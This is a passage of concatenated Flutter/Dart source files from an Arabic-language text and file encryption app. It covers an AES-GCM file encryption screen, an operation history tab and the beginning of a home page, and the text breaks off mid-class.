//                                   tooltip: 'نسخ النتيجة',
//                                   onPressed: () {
//                                     Clipboard.setData(
//                                         ClipboardData(text: state.outputText));
//                                     ScaffoldMessenger.of(context).showSnackBar(
//                                       SnackBar(
//                                           content: Text(
//                                               '✅ تم نسخ النتيجة إلى الحافظة.',
//                                               style: GoogleFonts.cairo()),
//                                           duration: const Duration(seconds: 2)),
//                                     );
//                                     // Clear clipboard after a delay (e.g., 60 seconds)
//                                     Timer(const Duration(seconds: 60), () {
//                                       Clipboard.getData(Clipboard.kTextPlain)
//                                           .then((value) {
//                                         if (value?.text == state.outputText) {
//                                           Clipboard.setData(
//                                               const ClipboardData(text: ''));
//                                           print(
//                                               "Clipboard cleared after 60 seconds.");
//                                         }
//                                       });
//                                     });
//                                   },
//                                 ),
//                                 IconButton(
//                                   icon: const Icon(Icons.share_outlined,
//                                       size: 20),
//                                   tooltip: 'مشاركة النتيجة',
//                                   onPressed: () {
//                                     Share.share(state.outputText);
//                                   },
//                                 ),
//                               ],
//                             ),
//                         ],
//                       ),
//                       const SizedBox(height: 10),
//                       // Animated Text for non-error output
//                       state.outputText.startsWith('❌')
//                           ? SelectableText(
//                               state.outputText
//                                   .substring(2), // Remove error marker
//                               style: GoogleFonts.cairo(
//                                 // Apply Cairo font
//                                 textStyle: TextStyle(
//                                     color: Colors.red.shade900, fontSize: 14),
//                               ),
//                             )
//                           : AnimatedSize(
//                               duration: const Duration(milliseconds: 300),
//                               child: SelectableText(
//                                 state.outputText,
//                                 style: GoogleFonts.cairo(
//                                   // Apply Cairo font
//                                   textStyle: TextStyle(
//                                     fontSize: 14,
//                                     color: isDark
//                                         ? Colors.grey[300]
//                                         : Colors.black87,
//                                     height: 1.5,
//                                   ),
//                                 ),
//                               ),
//                             ),
//                       // Example of AnimatedTextKit (can be used selectively)
//                       // AnimatedTextKit(
//                       //   animatedTexts: [
//                       //     TypewriterAnimatedText(
//                       //       state.outputText,
//                       //       textStyle: TextStyle(
//                       //         fontSize: 14.0,
//                       //         color: isDark ? Colors.grey[300] : Colors.black87,
//                       //       ),
//                       //       speed: const Duration(milliseconds: 50),
//                       //     ),
//                       //   ],
//                       //   totalRepeatCount: 1,
//                       //   displayFullTextOnTap: true,
//                       //   stopPauseOnTap: true,
//                       // ),
//                     ],
//                   ),
//                 ),
//               ),
//           ],
//         ),
//       ),
//     );
//   }

//   // Helper to get button text based on mode
//   String _getOperationButtonText(OperationMode mode) {
//     switch (mode) {
//       case OperationMode.encrypt:
//         return 'تشفير النص';
//       case OperationMode.decrypt:
//         return 'فك تشفير النص';
//       case OperationMode.hide:
//         return 'إخفاء النص (Zero-Width)';
//       case OperationMode.reveal:
//         return 'كشف النص (Zero-Width)';
//       case OperationMode.encryptAndHide:
//         return 'تشفير ثم إخفاء';
//       case OperationMode.revealAndDecrypt:
//         return 'كشف ثم فك تشفير';
//     }
//   }

//   // Helper to get icon based on mode
//   Icon _getOperationIcon(OperationMode mode) {
//     switch (mode) {
//       case OperationMode.encrypt:
//         return const Icon(Icons.enhanced_encryption_outlined);
//       case OperationMode.decrypt:
//         return const Icon(Icons.lock_open_outlined);
//       case OperationMode.hide:
//         return const Icon(Icons.visibility_off_outlined);
//       case OperationMode.reveal:
//         return const Icon(Icons.visibility_outlined);
//       case OperationMode.encryptAndHide:
//         return const Icon(Icons.security_outlined);
//       case OperationMode.revealAndDecrypt:
//         return const Icon(Icons.key_outlined);
//     }
//   }

//   // Helper widget for operation mode selection
//   Widget _buildOperationModeSelector(BuildContext context,
//       EncryptionState state, EncryptionNotifier notifier) {
//     final theme = Theme.of(context);
//     return Column(
//       crossAxisAlignment: CrossAxisAlignment.start,
//       children: [
//         Text(
//           'اختر العملية المطلوبة:',
//           style: GoogleFonts.cairo(
//             // Apply Cairo font
//             textStyle: theme.textTheme.titleMedium
//                 ?.copyWith(fontWeight: FontWeight.bold),
//           ),
//         ),
//         const SizedBox(height: 8),
//         DropdownButtonFormField<OperationMode>(
//           value: state.operationMode,
//           items: OperationMode.values.map((OperationMode mode) {
//             return DropdownMenuItem<OperationMode>(
//               value: mode,
//               child: Text(_getOperationMenuText(mode),
//                   style: GoogleFonts.cairo()), // Apply Cairo font
//             );
//           }).toList(),
//           onChanged: (OperationMode? newValue) {
//             if (newValue != null) {
//               notifier.setOperationMode(newValue);
//             }
//           },
//           decoration: const InputDecoration(
//             prefixIcon: Icon(Icons.settings_applications_outlined),
//             contentPadding: EdgeInsets.symmetric(horizontal: 16, vertical: 12),
//           ),
//         ),
//       ],
//     );
//   }

//   // Helper to get dropdown menu text
//   String _getOperationMenuText(OperationMode mode) {
//     switch (mode) {
//       case OperationMode.encrypt:
//         return 'تشفير (AES-GCM)';
//       case OperationMode.decrypt:
//         return 'فك تشفير (AES-GCM)';
//       case OperationMode.hide:
//         return 'إخفاء (Zero-Width)';
//       case OperationMode.reveal:
//         return 'كشف (Zero-Width)';
//       case OperationMode.encryptAndHide:
//         return 'تشفير ثم إخفاء';
//       case OperationMode.revealAndDecrypt:
//         return 'كشف ثم فك تشفير';
//     }
//   }
// }



// ------------------------------ نهاية الملف: encryption_tab.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: file_encryption_tab.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\file_encryption_tab\file_encryption_tab.dart
// ----------------------------------------------------------------------

// lib/presentation/file_encryption_tab/file_encryption_screen.dart
// import 'dart:io'; // إزالة إذا لم تستخدمه مباشرة هنا (Web لا يدعمه)
import 'package:cryptography/cryptography.dart';
import 'package:file_picker/file_picker.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';
// import 'package:path_provider/path_provider.dart'; // إزالة إذا لم تستخدمه
import 'package:path/path.dart' as path; // لا يزال مستخدمًا

import '../../core/encryption/aes_gcm_service.dart'; //  <<< تأكد من المسار
import '../../core/logging/logger_provider.dart'; //  <<< لاستخدام appLoggerProvider
import '../../core/logging/logger_service.dart';
import '../../core/utils/file_saver.dart';
// لا حاجة لاستيراد ../encryption_tab/encryption_tab.dart

enum FileOperationMode { encrypt, decrypt }

class FileEncryptionState {
  final PlatformFile? inputFile;
  final String passwordInput;
  final String outputMessage;
  final bool isLoading;
  final double progress;
  final bool isPasswordVisible;
  final FileOperationMode operationMode;

  FileEncryptionState({
    this.inputFile,
    this.passwordInput = '',
    this.outputMessage = '',
    this.isLoading = false,
    this.progress = 0.0,
    this.isPasswordVisible = false,
    this.operationMode = FileOperationMode.encrypt,
  });

  FileEncryptionState copyWith({
    PlatformFile? inputFile,
    String? passwordInput,
    String? outputMessage,
    bool? isLoading,
    double? progress,
    bool? isPasswordVisible,
    FileOperationMode? operationMode,
    bool clearInputFile = false,
  }) {
    return FileEncryptionState(
      inputFile: clearInputFile ? null : inputFile ?? this.inputFile,
      passwordInput: passwordInput ?? this.passwordInput,
      outputMessage: outputMessage ?? this.outputMessage,
      isLoading: isLoading ?? this.isLoading,
      progress: progress ?? this.progress,
      isPasswordVisible: isPasswordVisible ?? this.isPasswordVisible,
      operationMode: operationMode ?? this.operationMode,
    );
  }
}

class FileEncryptionNotifier extends StateNotifier<FileEncryptionState> {
  final AesGcmService _aesService;
  final LoggerService _logger; // إضافة logger

  FileEncryptionNotifier(this._aesService, this._logger)
      : super(FileEncryptionState());

  void setOperationMode(FileOperationMode mode) => state = state.copyWith(
      operationMode: mode, outputMessage: '', inputFile: null, progress: 0.0);
  void updatePasswordInput(String value) =>
      state = state.copyWith(passwordInput: value);
  void togglePasswordVisibility() =>
      state = state.copyWith(isPasswordVisible: !state.isPasswordVisible);

  void resetState() {
    state = state.copyWith(
      clearInputFile: true, // سيقوم بتعيين inputFile إلى null
      // passwordInput: '', // قد يرغب المستخدم في الاحتفاظ بكلمة المرور
      outputMessage: '',
      isLoading: false,
      progress: 0.0,
    );
  }

  Future<void> pickFile() async {
    try {
      _logger.info("pickFile", "Attempting to pick file.");
      FilePickerResult? result = await FilePicker.platform.pickFiles();
      if (result != null && result.files.isNotEmpty) {
        _logger.info("pickFile", "File picked: ${result.files.first.name}");
        state = state.copyWith(
          inputFile: result.files.first,
          outputMessage: '',
          progress: 0.0,
        );
      } else {
        _logger.info("pickFile", "File picking cancelled by user.");
        state = state.copyWith(
            outputMessage: 'لم يتم اختيار أي ملف.'); // رسالة أوضح
      }
    } catch (e, stackTrace) {
      _logger.error("pickFile", "Error during file picking", e, stackTrace);
      state = state.copyWith(
          outputMessage: '❌ خطأ أثناء اختيار الملف: ${e.toString()}');
    }
  }

  Future<void> performFileOperation() async {
    if (state.inputFile == null) {
      state = state.copyWith(outputMessage: '❌ يرجى اختيار ملف أولاً.');
      return;
    }
    if (state.passwordInput.isEmpty) {
      state = state.copyWith(outputMessage: '❌ يرجى إدخال كلمة مرور.');
      return;
    }
    state = state.copyWith(
        isLoading: true, outputMessage: 'جاري التهيئة...', progress: 0.0);
    _logger.info("performFileOperation",
        "Starting file operation. Mode: ${state.operationMode}, File: ${state.inputFile!.name}");

    try {
      final inputFile = state.inputFile!;
      final inputFileName = inputFile.name; // اسم الملف الأصلي
      final fileBytes = inputFile.bytes;

      if (fileBytes == null) {
        _logger.error("performFileOperation",
            "File bytes are null for ${inputFile.name}.");
        throw Exception(
            "لا يمكن قراءة بيانات الملف المختار. قد يكون الملف كبيرًا جدًا للقراءة المباشرة في الذاكرة على هذه المنصة.");
      }
      _logger.debug(
          "performFileOperation", "File bytes length: ${fileBytes.length}");

      final password = state.passwordInput;
      final isEncrypting = state.operationMode == FileOperationMode.encrypt;

      state = state.copyWith(
          outputMessage:
              isEncrypting ? 'جاري التشفير...' : 'جاري فك التشفير...',
          progress: 0.2);

      Uint8List resultBytes;
      if (isEncrypting) {
        resultBytes =
            await _aesService.encryptBytesWithPassword(fileBytes, password);
      } else {
        resultBytes =
            await _aesService.decryptBytesWithPassword(fileBytes, password);
      }
      _logger.info("performFileOperation",
          "Encryption/Decryption complete. Result bytes length: ${resultBytes.length}");

      state =
          state.copyWith(outputMessage: 'تجهيز الملف للحفظ...', progress: 0.7);
      final outputFileName = isEncrypting
          ? '${path.basenameWithoutExtension(inputFileName)}.conduit_enc' // امتداد مميز
          : (inputFileName.endsWith('.conduit_enc')
              ? inputFileName.substring(
                  0, inputFileName.length - '.conduit_enc'.length)
              : 'decrypted_$inputFileName');
      _logger.info("performFileOperation", "Output file name: $outputFileName");

      state = state.copyWith(outputMessage: 'جاري حفظ الملف...', progress: 0.9);
      // FileSaver.saveFile هو للويب. ستحتاج إلى طريقة حفظ مختلفة للموبايل
      // هنا يجب عليك تحديد منصة التشغيل
      if (kIsWeb) {
        await FileSaver.saveFile(
            bytes: resultBytes, suggestedFileName: outputFileName);
      } else {
        //   // منطق حفظ الملف للموبايل (يتطلب أذونات ومسارات)
        //   // ... هذا الجزء يحتاج تنفيذ خاص للموبايل ...
        _logger.warn("performFileOperation",
            "Mobile file saving not yet implemented. Data is in memory.");
        throw Exception(
            "حفظ الملفات على الهاتف غير مدعوم حاليًا في هذه النسخة التجريبية.");
      }
      await FileSaver.saveFile(
          bytes: resultBytes,
          suggestedFileName: outputFileName); // افتراض أنه يعمل للويب حاليًا

      state = state.copyWith(
          isLoading: false,
          outputMessage: '✅ تمت معالجة وحفظ الملف بنجاح باسم: $outputFileName',
          progress: 1.0);
      _logger.info("performFileOperation",
          "File operation successful. Saved as: $outputFileName");
    } on SecretBoxAuthenticationError {
      _logger.warn("performFileOperation",
          "Authentication failed (wrong password or data tampered)");
      state = state.copyWith(
        isLoading: false,
        outputMessage:
            '❌ خطأ: فشل فك تشفير الملف. كلمة المرور خاطئة أو الملف تالف.',
        progress: 0.0,
      );
      // لا حاجة لـ throw هنا
    } catch (e, stackTrace) {
      _logger.error(
          "performFileOperation", "Error during file operation", e, stackTrace);
      final errorMessage = e.toString().replaceFirst("Exception: ", "");
      state = state.copyWith(
        isLoading: false,
        outputMessage: '❌ خطأ: $errorMessage',
        progress: 0.0,
      );
      // لا حاجة لـ throw هنا
    }
  }
}

final fileEncryptionScreenProvider = // تم تغيير الاسم
    StateNotifierProvider<FileEncryptionNotifier, FileEncryptionState>((ref) {
  return FileEncryptionNotifier(
    ref.watch(aesGcmServiceProvider),
    ref.watch(appLoggerProvider), // تمرير الـ logger
  );
});

// تم تغيير اسم الكلاس
class FileEncryptionScreen extends ConsumerWidget {
  const FileEncryptionScreen({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final state = ref.watch(fileEncryptionScreenProvider);
    final notifier = ref.read(fileEncryptionScreenProvider.notifier);
    final theme = Theme.of(context);

    return Directionality(
      textDirection: TextDirection.rtl,
      child: Scaffold(
        body: SingleChildScrollView(
          padding: const EdgeInsets.all(16.0),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              _buildFileOperationModeSelector(context, state, notifier),
              const SizedBox(height: 20),
              Card(
                elevation: 2,
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(12)),
                child: Padding(
                  padding: const EdgeInsets.all(16.0),
                  child: Column(
                    children: [
                      ElevatedButton.icon(
                        icon: Icon(Icons.attach_file_rounded,
                            color: Colors.white.withOpacity(0.9)),
                        label: Text('اختر ملفًا للمعالجة',
                            style: GoogleFonts.cairo(
                                fontSize: 16, fontWeight: FontWeight.w500)),
                        onPressed: state.isLoading ? null : notifier.pickFile,
                        style: ElevatedButton.styleFrom(
                          minimumSize: const Size(double.infinity, 50),
                          shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(10)),
                          elevation: 2,
                        ),
                      ),
                      const SizedBox(height: 16),
                      if (state.inputFile != null)
                        Container(
                          padding: const EdgeInsets.symmetric(
                              horizontal: 12, vertical: 10),
                          decoration: BoxDecoration(
                              color: theme.colorScheme.surfaceContainerHighest
                                  .withOpacity(0.3),
                              borderRadius: BorderRadius.circular(8),
                              border: Border.all(
                                  color: theme.primaryColor.withOpacity(0.3))),
                          child: Row(
                            children: [
                              Icon(Icons.insert_drive_file_rounded,
                                  color: theme.primaryColor, size: 28),
                              const SizedBox(width: 10),
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text(
                                      state.inputFile!.name,
                                      style: GoogleFonts.cairo(
                                          fontSize: 14,
                                          fontWeight: FontWeight.w500),
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    if (state.inputFile!.size > 0)
                                      Text(
                                        'الحجم: ${(state.inputFile!.size / 1024).toStringAsFixed(2)} KB',
                                        style: GoogleFonts.cairo(
                                            fontSize: 11,
                                            color: Colors.grey[600]),
                                      ),
                                  ],
                                ),
                              ),
                              IconButton(
                                icon: Icon(Icons.close_rounded,
                                    size: 20, color: Colors.grey[700]),
                                onPressed: state.isLoading
                                    ? null
                                    : notifier.resetState,
                                tooltip: 'إلغاء اختيار الملف',
                              )
                            ],
                          ),
                        )
                      else
                        Text('لم يتم اختيار أي ملف بعد.',
                            style: GoogleFonts.cairo(
                                textStyle: TextStyle(
                                    color: Colors.grey[600], fontSize: 14))),
                    ],
                  ),
                ),
              ),
              const SizedBox(height: 16),
              Card(
                elevation: 2,
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(12)),
                child: Padding(
                  padding: const EdgeInsets.all(16.0),
                  child: TextField(
                    controller: TextEditingController(text: state.passwordInput)
                      ..selection = TextSelection.fromPosition(
                          TextPosition(offset: state.passwordInput.length)),
                    onChanged: notifier.updatePasswordInput,
                    obscureText: !state.isPasswordVisible,
                    style: GoogleFonts.cairo(fontSize: 16, letterSpacing: 1),
                    decoration: InputDecoration(
                      labelText: 'كلمة المرور',
                      labelStyle: GoogleFonts.cairo(),
                      hintText: 'مطلوبة لتشفير وفك تشفير الملفات...',
                      hintStyle: GoogleFonts.cairo(color: Colors.grey[500]),
                      prefixIcon: Icon(Icons.password_rounded,
                          color: theme.iconTheme.color?.withOpacity(0.7)),
                      suffixIcon: IconButton(
                        icon: Icon(
                            state.isPasswordVisible
                                ? Icons.visibility_off_outlined
                                : Icons.visibility_outlined,
                            color: theme.iconTheme.color?.withOpacity(0.7)),
                        onPressed: notifier.togglePasswordVisibility,
                      ),
                      border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(8)),
                    ),
                  ),
                ),
              ),
              const SizedBox(height: 24),
              ElevatedButton.icon(
                icon: state.isLoading
                    ? const SizedBox(
                        width: 20,
                        height: 20,
                        child: CircularProgressIndicator(
                            strokeWidth: 3, color: Colors.white))
                    : Icon(state.operationMode == FileOperationMode.encrypt
                        ? Icons.enhanced_encryption_rounded
                        : Icons.lock_open_rounded),
                label: Text(
                    state.isLoading
                        ? 'جاري المعالجة...'
                        : (state.operationMode == FileOperationMode.encrypt
                            ? 'تشفير الملف المختار'
                            : 'فك تشفير الملف المختار'),
                    style: GoogleFonts.cairo(
                        fontWeight: FontWeight.bold, fontSize: 16)),
                onPressed: (state.isLoading ||
                        state.inputFile == null ||
                        state.passwordInput.isEmpty)
                    ? null
                    : () async {
                        FocusScope.of(context).unfocus(); // إخفاء لوحة المفاتيح
                        try {
                          await notifier.performFileOperation();
                          if (context.mounted &&
                              !state.isLoading &&
                              (ref
                                      .read(fileEncryptionScreenProvider)
                                      .outputMessage
                                      .isNotEmpty &&
                                  !ref
                                      .read(fileEncryptionScreenProvider)
                                      .outputMessage
                                      .startsWith('❌'))) {
                            ScaffoldMessenger.of(context).showSnackBar(
                              SnackBar(
                                  content: Text(
                                      ref
                                          .read(fileEncryptionScreenProvider)
                                          .outputMessage,
                                      style: GoogleFonts.cairo()),
                                  behavior: SnackBarBehavior.floating,
                                  backgroundColor: Colors.green[700],
                                  duration: const Duration(seconds: 4)),
                            );
                          }
                        } catch (e) {
                          if (context.mounted) {
                            showDialog(
                              context: context,
                              builder: (ctx) => AlertDialog(
                                title: Text('حدث خطأ في العملية',
                                    style: GoogleFonts.cairo()),
                                content: Text(
                                    e
                                        .toString()
                                        .replaceFirst("Exception: ", ""),
                                    style: GoogleFonts.cairo()),
                                actions: [
                                  TextButton(
                                      onPressed: () => Navigator.of(ctx).pop(),
                                      child: Text('حسنًا',
                                          style: GoogleFonts.cairo(
                                              color: theme.primaryColor)))
                                ],
                              ),
                            );
                          }
                        }
                      },
                style: ElevatedButton.styleFrom(
                  padding: const EdgeInsets.symmetric(vertical: 14),
                  shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(10)),
                  elevation: 3,
                ),
              ),
              const SizedBox(height: 20),
              if (state.isLoading)
                Padding(
                  padding: const EdgeInsets.symmetric(vertical: 8.0),
                  child: Column(
                    children: [
                      LinearProgressIndicator(
                        value: state.progress,
                        backgroundColor: theme.primaryColor.withOpacity(0.2),
                        color: theme.primaryColor,
                        minHeight: 6,
                      ),
                      const SizedBox(height: 8),
                      Text(state.outputMessage,
                          style: GoogleFonts.cairo(
                              textStyle: TextStyle(
                                  color: theme.primaryColor, fontSize: 14))),
                    ],
                  ),
                )
              else if (state.outputMessage.isNotEmpty)
                Padding(
                  padding: const EdgeInsets.symmetric(vertical: 8.0),
                  child: Text(
                    state.outputMessage,
                    style: GoogleFonts.cairo(
                        textStyle: TextStyle(
                            color: state.outputMessage.startsWith('❌')
                                ? Colors.red.shade700
                                : Colors.green.shade700,
                            fontSize: 14,
                            fontWeight: FontWeight.w500)),
                    textAlign: TextAlign.center,
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildFileOperationModeSelector(BuildContext context,
      FileEncryptionState state, FileEncryptionNotifier notifier) {
    final theme = Theme.of(context);
    return SegmentedButton<FileOperationMode>(
      segments: <ButtonSegment<FileOperationMode>>[
        ButtonSegment<FileOperationMode>(
          value: FileOperationMode.encrypt,
          label: Text('تشفير ملف',
              style: GoogleFonts.cairo(
                  fontWeight: state.operationMode == FileOperationMode.encrypt
                      ? FontWeight.w600
                      : FontWeight.normal)),
          icon: const Icon(Icons.enhanced_encryption_outlined, size: 20),
        ),
        ButtonSegment<FileOperationMode>(
          value: FileOperationMode.decrypt,
          label: Text('فك تشفير ملف',
              style: GoogleFonts.cairo(
                  fontWeight: state.operationMode == FileOperationMode.decrypt
                      ? FontWeight.w600
                      : FontWeight.normal)),
          icon: const Icon(Icons.lock_open_outlined, size: 20),
        ),
      ],
      selected: {state.operationMode},
      onSelectionChanged: (Set<FileOperationMode> newSelection) {
        notifier.setOperationMode(newSelection.first);
      },
      style: SegmentedButton.styleFrom(
        backgroundColor:
            theme.colorScheme.surfaceContainerHighest.withOpacity(0.3),
        selectedBackgroundColor: theme.primaryColor.withOpacity(0.9),
        selectedForegroundColor: Colors.white,
        foregroundColor: theme.colorScheme.onSurfaceVariant,
        textStyle: GoogleFonts.cairo(fontSize: 13),
        padding: const EdgeInsets.symmetric(vertical: 10),
      ),
      showSelectedIcon: false, // لإخفاء أيقونة الاختيار الافتراضية
    );
  }
}



// ------------------------------ نهاية الملف: file_encryption_tab.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: history_tab.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\history_tab\history_tab.dart
// ----------------------------------------------------------------------

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_slidable/flutter_slidable.dart';

import '../../core/history/history_item.dart'; // يستخدم هذا
import '../../core/history/history_service.dart';

// --- (باقي الكود كما هو: Providers, HistoryListNotifier, HistoryTab class structure) ---
// Provider for the history list
final historyListProvider =
    StateNotifierProvider<HistoryListNotifier, List<HistoryItem>>((ref) {
  return HistoryListNotifier(ref.watch(historyServiceProvider));
});

class HistoryListNotifier extends StateNotifier<List<HistoryItem>> {
  final HistoryService _historyService;

  HistoryListNotifier(this._historyService) : super([]) {
    loadHistory();
  }

  Future<void> loadHistory() async {
    // افترض أن _historyService.loadHistory() ترجع List<HistoryItem>
    // وأنها تتعامل مع fromJson إذا كان السجل مخزناً في JSON
    state = await _historyService.loadHistory();
  }

  Future<void> deleteItem(String id) async {
    await _historyService.deleteItem(id);
    await loadHistory();
  }

  Future<void> clearAllHistory() async {
    await _historyService.clearHistory();
    state = [];
  }
}

class HistoryTab extends ConsumerWidget {
  const HistoryTab({super.key});

  String _formatDate(DateTime d) =>
      '${d.day}/${d.month}/${d.year} ${d.hour}:${d.minute.toString().padLeft(2, '0')}';

  void _showItemDetails(BuildContext context, HistoryItem item) {
    showDialog(
      context: context,
      builder: (dialogContext) => AlertDialog(
        title: const Text('تفاصيل العملية'),
        content: SingleChildScrollView(
          child: ListBody(
            children: <Widget>[
              _buildDetailRow('الوقت:', _formatDate(item.timestamp)),
              _buildDetailRow('النوع:', item.operationDescription),
              // **التعديل هنا: استخدام originalInput**
              if (item.originalInput != null && item.originalInput!.isNotEmpty)
                _buildDetailRow(
                    'الإدخال الأصلي (للتشفير/الإخفاء):', item.originalInput!,
                    isSelectable: true),
              // **التعديل هنا: استخدام processedInput**
              if (item.processedInput != null &&
                  item.processedInput!.isNotEmpty)
                _buildDetailRow(
                    'الإدخال المُعالج (للفك/الكشف):', item.processedInput!,
                    isSelectable: true),
              if (item.coverText != null && item.coverText!.isNotEmpty)
                _buildDetailRow('نص الغطاء:', item.coverText!,
                    isSelectable: true),
              _buildDetailRow('النتيجة:', item.output, isSelectable: true),
              _buildDetailRow(
                  'استخدام كلمة مرور:', item.usedPassword ? 'نعم' : 'لا'),
              _buildDetailRow(
                  'استخدام إخفاء:', item.usedSteganography ? 'نعم' : 'لا'),
            ],
          ),
        ),
        actions: <Widget>[
          if (item.output.isNotEmpty && !item.output.startsWith('❌'))
            TextButton.icon(
              icon: const Icon(Icons.copy_outlined),
              label: const Text('نسخ النتيجة'),
              onPressed: () {
                Clipboard.setData(ClipboardData(text: item.output));
                Navigator.of(dialogContext).pop();
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(
                    const SnackBar(
                        content: Text('✅ تم نسخ النتيجة'),
                        duration: Duration(seconds: 2)),
                  );
                }
              },
            ),
          TextButton(
            child: const Text('إغلاق'),
            onPressed: () {
              Navigator.of(dialogContext).pop();
            },
          ),
        ],
      ),
    );
  }

  Widget _buildDetailRow(String label, String value,
      {bool isSelectable = false}) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4.0),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text('$label ', style: const TextStyle(fontWeight: FontWeight.bold)),
          Expanded(
            child: isSelectable
                ? SelectableText(value, textAlign: TextAlign.right)
                : Text(value, textAlign: TextAlign.right),
          ),
        ],
      ),
    );
  }

  // --- (باقي الكود لـ _confirmClearHistory و build و _getOperationIcon كما هو) ---
  void _confirmClearHistory(BuildContext context, WidgetRef ref) {
    showDialog(
      context: context,
      builder: (dialogContext) => AlertDialog(
        title: const Text('مسح السجل'),
        content: const Text(
            'هل أنت متأكد من رغبتك في مسح جميع سجل العمليات؟ لا يمكن التراجع عن هذا الإجراء.'),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(dialogContext),
            child: const Text('إلغاء'),
          ),
          TextButton(
            onPressed: () async {
              await ref.read(historyListProvider.notifier).clearAllHistory();
              Navigator.pop(dialogContext);
              if (context.mounted) {
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(
                      content: Text('🗑️ تم مسح السجل بنجاح'),
                      duration: Duration(seconds: 2)),
                );
              }
            },
            child: const Text('مسح الكل', style: TextStyle(color: Colors.red)),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final historyList = ref.watch(historyListProvider);
    final notifier = ref.read(historyListProvider.notifier);
    final theme = Theme.of(context);

    ref.listen(historyListProvider, (_, __) {});

    if (historyList.isEmpty) {
      return Directionality(
        textDirection: TextDirection.rtl,
        child: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.history_toggle_off_outlined,
                  size: 80, color: Colors.grey),
              const SizedBox(height: 16),
              const Text('لا يوجد سجل عمليات بعد',
                  style: TextStyle(fontSize: 18, color: Colors.grey)),
              const SizedBox(height: 24),
              ElevatedButton.icon(
                onPressed: () {
                  final tabController = DefaultTabController.of(context);
                  tabController.animateTo(0);
                },
                icon: const Icon(Icons.add_circle_outline),
                label: const Text('بدء عملية جديدة'),
              ),
            ],
          ),
        ),
      );
    }
    return Directionality(
      textDirection: TextDirection.rtl,
      child: Column(
        children: [
          Padding(
            padding: const EdgeInsets.fromLTRB(16, 16, 16, 8),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Text(
                  'العمليات السابقة (${historyList.length})',
                  style: theme.textTheme.titleMedium
                      ?.copyWith(fontWeight: FontWeight.bold),
                ),
                IconButton(
                  icon:
                      Icon(Icons.delete_sweep_outlined, color: Colors.red[400]),
                  tooltip: 'مسح كل السجل',
                  onPressed: () => _confirmClearHistory(context, ref),
                ),
              ],
            ),
          ),
          const Divider(height: 1),
          Expanded(
            child: ListView.builder(
              itemCount: historyList.length,
              itemBuilder: (_, index) {
                final item = historyList[index];
                return Slidable(
                  key: ValueKey(item.id),
                  endActionPane: ActionPane(
                    motion: const ScrollMotion(),
                    extentRatio: 0.25,
                    children: [
                      SlidableAction(
                        onPressed: (_) async {
                          await notifier.deleteItem(item.id);
                          if (context.mounted) {
                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(
                                  content: Text('تم حذف العنصر'),
                                  duration: Duration(seconds: 1)),
                            );
                          }
                        },
                        backgroundColor: Colors.red,
                        foregroundColor: Colors.white,
                        icon: Icons.delete_outline,
                        label: 'حذف',
                      ),
                    ],
                  ),
                  child: ListTile(
                    leading: Icon(_getOperationIcon(item.operationType),
                        color: theme.primaryColor),
                    title: Text(item.operationDescription,
                        style: const TextStyle(fontWeight: FontWeight.w500)),
                    subtitle: Text(
                      'الوقت: ${_formatDate(item.timestamp)}\nالنتيجة: ${item.output.length > 50 ? '${item.output.substring(0, 50)}...' : item.output}',
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    ),
                    trailing: const Icon(Icons.arrow_forward_ios,
                        size: 16, color: Colors.grey),
                    isThreeLine: true,
                    onTap: () => _showItemDetails(context, item),
                  ),
                );
              },
            ),
          ),
        ],
      ),
    );
  }

  IconData _getOperationIcon(OperationType type) {
    switch (type) {
      case OperationType.encryptAes:
        return Icons.enhanced_encryption_outlined;
      case OperationType.decryptAes:
        return Icons.lock_open_outlined;
      case OperationType.encodeZeroWidth:
        return Icons.visibility_off_outlined;
      case OperationType.decodeZeroWidth:
        return Icons.visibility_outlined;
      case OperationType.encryptThenHide:
        return Icons.security_outlined;
      case OperationType.revealThenDecrypt:
        return Icons.key_outlined;
      case OperationType.encryptFile:
        return Icons.attach_file_outlined; // مثال
      case OperationType.decryptFile:
        return Icons.file_open_outlined; // مثال
      case OperationType.embedImageStego:
        return Icons.image_outlined; // مثال
      case OperationType.extractImageStego:
        return Icons.image_search_outlined; // مثال
    }
  }
}



// ------------------------------ نهاية الملف: history_tab.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: home_page.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\home\home_page.dart
// ----------------------------------------------------------------------

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../about_tab/about_tab.dart';
import '../chat/chat_list_screen.dart';
import '../debug_monitor/debug_monitor_screen.dart'; // إضافة استيراد شاشة المراقبة
import '../history_tab/history_tab.dart';

class HomePage extends ConsumerStatefulWidget {
  const HomePage({super.key});

  @override
